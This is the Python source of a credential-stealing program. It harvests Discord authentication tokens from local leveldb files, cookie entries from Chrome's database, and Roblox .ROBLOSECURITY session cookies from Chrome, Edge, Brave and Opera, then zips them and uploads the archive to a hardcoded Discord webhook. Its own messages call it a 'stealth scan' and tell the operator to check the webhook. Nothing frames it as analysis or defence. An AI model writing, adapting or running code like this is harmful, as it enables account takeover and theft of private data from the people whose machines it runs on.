import os, sqlite3, json, shutil, zipfile, requests
from Crypto.Cipher import AES
from discord_webhook import send_webhook

WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1500477243493974108/H_c_jCu9dIgj5G7v49zaX98lqpMw4qTjbL4jHZpBO2mcSlAtL4U1iG9mykRFlQPTtLFw"

def grab_tokens():
    tokens = []
    paths = [
        os.path.expanduser("~/AppData/Local/Discord/Local Storage/leveldb"),
        os.path.expanduser("~/AppData/Roaming/Discord/Local Storage/leveldb"),
    ]
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if file.endswith(".ldb") or file.endswith(".log"):
                with open(os.path.join(path, file), "r", errors="ignore") as f:
                    content = f.read()
                    # Simple regex for token extraction (basic impl)
                    import re
                    matches = re.findall(r"[A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}", content)
                    tokens.extend(matches)
    return list(set(tokens))

def grab_browser_data():
    # Grabs cookies, passwords, cards from Chromium browsers
    user_data = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data")
    if not os.path.exists(user_data):
        return {}
    
    # Simplified demonstration – in production, decrypt with AES
    data = {"cookies": [], "passwords": [], "cards": []}
    
    # Cookies extraction (basic example)
    cookies_db = os.path.join(user_data, "Default", "Cookies")
    if os.path.exists(cookies_db):
        conn = sqlite3.connect(cookies_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for row in cursor.fetchall():
            data["cookies"].append({"host": row[0], "name": row[1]})
        conn.close()
    
    return data

def grab_roblox_cookies():
    roblox_cookies = []
    browsers = [
        ("Chrome", os.path.expanduser("~/AppData/Local/Google/Chrome/User Data")),
        ("Edge", os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data")),
        ("Brave", os.path.expanduser("~/AppData/Local/BraveSoftware/Brave-Browser/User Data")),
        ("Opera", os.path.expanduser("~/AppData/Roaming/Opera Software/Opera Stable")),
    ]
    
    for name, path in browsers:
        if not os.path.exists(path):
            continue
        cookies_db = os.path.join(path, "Default", "Cookies")
        if os.path.exists(cookies_db):
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'")
            for row in cursor.fetchall():
                if ".ROBLOSECURITY" in row[0]:
                    roblox_cookies.append(f"[{name}] .ROBLOSECURITY = {row[1][:50]}...")  # truncated
            conn.close()
    return roblox_cookies

def zip_and_send(data):
    with zipfile.ZipFile("collected_data.zip", "w") as zf:
        zf.writestr("tokens.txt", "\n".join(data.get("tokens", [])))
        zf.writestr("cookies.json", json.dumps(data.get("cookies", [])))
        zf.writestr("roblox.txt", "\n".join(data.get("roblox", [])))
    
    with open("collected_data.zip", "rb") as f:
        requests.post(WEBHOOK_URL, files={"file": ("data.zip", f)})

if __name__ == "__main__":
    print("Running stealth scan...")
    tokens = grab_tokens()
    browser_data = grab_browser_data()
    roblox_data = grab_roblox_cookies()
    
    all_data = {
        "tokens": tokens,
        "cookies": browser_data.get("cookies"),
        "passwords": browser_data.get("passwords"),
        "roblox": roblox_data
    }
    
    zip_and_send(all_data)
    print("Done. Check your webhook.")
